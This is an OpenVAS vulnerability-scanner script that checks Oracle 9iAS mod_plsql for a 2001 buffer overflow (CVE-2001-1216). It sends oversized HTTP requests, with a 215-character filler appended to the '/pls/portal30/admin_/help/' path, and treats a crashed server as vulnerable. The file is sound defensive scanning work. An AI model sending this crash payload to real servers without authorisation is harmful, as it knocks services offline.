# OpenVAS Vulnerability Test
# $Id: oracle9i_mod_plsql_overflow.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Oracle 9iAS mod_plsql Buffer Overflow
#
# Authors:
# Matt Moore <matt@westpoint.ltd.uk>
#
# Copyright:
# Copyright (C) 2002 Matt Moore
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10840");
  script_version("2019-04-10T13:42:28+0000");
  script_tag(name:"last_modification", value:"2019-04-10 13:42:28 +0000 (Wed, 10 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3726);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2001-1216");
  script_name("Oracle 9iAS mod_plsql Buffer Overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Matt Moore");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("www/OracleApache");

  script_xref(name:"URL", value:"http://www.nextgenss.com/advisories/plsql.txt");
  script_xref(name:"URL", value:"http://otn.oracle.com/deploy/security/pdf/modplsql.pdf");

  script_tag(name:"solution", value:"Oracle have released a patch for this vulnerability.");

  script_tag(name:"summary", value:"Oracle 9i Application Server uses Apache as it's web
  server. There is a buffer overflow in the mod_plsql module
  which allows an attacker to run arbitrary code.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

# Send 215 chars at the end of the URL
buf = http_get(item:string("/XXX/XXXXXXXX/XXXXXXX/XXXX/", crap(215)), port:port);
send(socket:soc, data:buf);
recv = http_recv(socket:soc);
close(soc);

if(!recv)
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

buf = http_get(item:string("/pls/portal30/admin_/help/", crap(215)), port:port);
send(socket:soc, data:buf);
unbreakable = http_recv(socket:soc);
http_close_socket(soc);

if(!unbreakable) {
  security_message(port:port);
  exit(0);
}

exit(99);